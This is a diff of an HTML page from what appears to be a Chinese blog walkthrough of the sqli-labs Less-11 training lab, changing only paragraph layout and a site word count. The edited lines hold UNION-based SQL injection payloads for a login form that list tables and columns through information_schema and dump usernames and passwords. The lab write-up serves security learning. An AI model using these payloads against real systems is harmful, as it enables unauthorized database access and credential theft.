@@ -507,19 +507,23 @@ HTML基础知识
 <ol start="5">
 <li><strong>爆表</strong></li>
 </ol>
-<p><code>username：1admin' union select 1,group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#</code><br><code>password：1234</code></p>
+<p><code>username：1admin' union select 1,group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#</code></p>
+<p><code>password：1234</code></p>
 <p><img src="https://i.loli.net/2019/10/24/B8kJoDzygmFh697.png" alt="less11-6.png"></p>
 <ol start="6">
 <li><strong>爆字段</strong></li>
 </ol>
-<p><code>username：1admin' union select 1,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#</code><br><code>password：1234</code></p>
+<p><code>username：1admin' union select 1,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#</code></p>
+<p><code>password：1234</code></p>
 <p><img src="https://i.loli.net/2019/10/24/lMk6ULfIZKdh1VC.png" alt="less11-7.png"></p>
 <ol start="7">
 <li><strong>爆数据</strong></li>
 </ol>
-<p><code>username：1admin' union select 1,group_concat(username) FROM security.users#</code><br><code>password：1234</code></p>
+<p><code>username：1admin' union select 1,group_concat(username) FROM security.users#</code></p>
+<p><code>password：1234</code></p>
 <p><img src="https://i.loli.net/2019/10/24/5kDou63UQplETRH.png" alt="less11-8.png"></p>
-<p><code>username：1admin' union select 1,group_concat(password) FROM security.users#</code><br><code>password：1234</code></p>
+<p><code>username：1admin' union select 1,group_concat(password) FROM security.users#</code></p>
+<p><code>password：1234</code></p>
 <p><img src="https://i.loli.net/2019/10/24/kwVWuHS6C9vrGYQ.png" alt="less11-9.png"></p>
 <h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="http://www.cnblogs.com/lcamry/category/846064.html" target="_blank" rel="noopener">mysql注入天书</a></p>
 <p><a href="https://blog.csdn.net/wang1006008051/article/details/78157325" target="_blank" rel="noopener">html中form表单的使用方法和介绍</a></p>
@@ -815,7 +819,7 @@ http://192.168.150.128/sqli-labs-master/Less-10/?id</div>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">26.8k</span>&nbsp;字
+                class="white-color">27.7k</span>&nbsp;字
                
             
 			
